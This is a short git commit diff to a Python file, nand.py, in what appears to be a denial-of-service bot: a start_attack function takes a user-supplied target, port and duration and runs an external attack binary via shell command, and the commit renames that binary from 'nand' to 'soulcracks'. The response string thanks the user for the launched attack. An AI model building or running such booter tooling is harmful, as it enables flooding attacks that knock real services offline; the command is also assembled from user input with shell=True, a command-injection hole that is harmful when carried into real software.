fea6c87766d29aa63e5b1eea39e2d8e317a9b001
plhannakabakj <kagdhzisbabahakajjzk@outlook.com>
2025-02-13 22:53:41 +0530

    Update nand.py

--- nand.py
+++ nand.py
@@ -297,7 +297,7 @@ def start_attack(user_id, target, port, time):
 
     try:
         # Simulate attack execution (original logic here)
-        full_command = f"./nand {target} {port} {time}"
+        full_command = f"./soulcracks {target} {port} {time}"
         process = subprocess.run(full_command, shell=True)
         response = f"ᴇɴᴢᴏʏ ʙʀᴏᴛʜᴇʀ ❤️. Target: {target} Port: {port} Time: {time}"
         return True, response
